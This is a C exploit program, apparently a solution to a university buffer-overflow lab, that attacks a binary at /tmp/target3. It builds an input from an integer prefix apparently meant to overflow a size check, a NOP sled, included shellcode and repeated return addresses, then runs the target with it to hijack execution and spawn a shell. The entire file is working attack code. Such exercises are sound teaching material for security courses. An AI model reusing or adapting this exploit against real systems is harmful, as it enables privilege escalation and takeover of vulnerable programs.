#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
#define WIDGET_SIZE 24 

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;


  // char* init_input = "4080219172,";
  char* init_input = "4080219174,";
  int init_input_len = strlen(init_input);

  char *buff; // The input we pass to break target3
  int buff_size = 240 * WIDGET_SIZE + init_input_len + 8;

  // Allocate memory for input, making sure there's enough
  if (!(buff = malloc(buff_size))) {
    fprintf(stderr, "Can't allocate memory.\n");
    exit(EXIT_FAILURE);
  }

  int i;

  // Count (first part of input)
  for (i = 0; i < init_input_len; i++) {
    buff[i] = init_input[i];
  }

  char *ret_address = "\xb0\xfa\xff\xbf";; // The new return address

  // Calculations
  int num_ret_blocks = 45;
  int shell_len = strlen(shellcode);
  int num_nop = buff_size - (init_input_len + shell_len + num_ret_blocks * WIDGET_SIZE);
  int shell_start = init_input_len + num_nop;
  int ret_start = init_input_len + num_nop + shell_len;

  
  // NOPs
  for(i = init_input_len; i < shell_start; i++) {
    buff[i] = NOP;
  }

  // Shellcode
  for(i = shell_start; i < ret_start; i++) {
    buff[i] = shellcode[i - shell_start];
  }

  // Return addresses
  for (i = ret_start; i < buff_size; i++) {
    buff[i] = ret_address[(i-ret_start) % 4];
  }

  args[1] = buff;
 
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(buff);
  return 0;
}
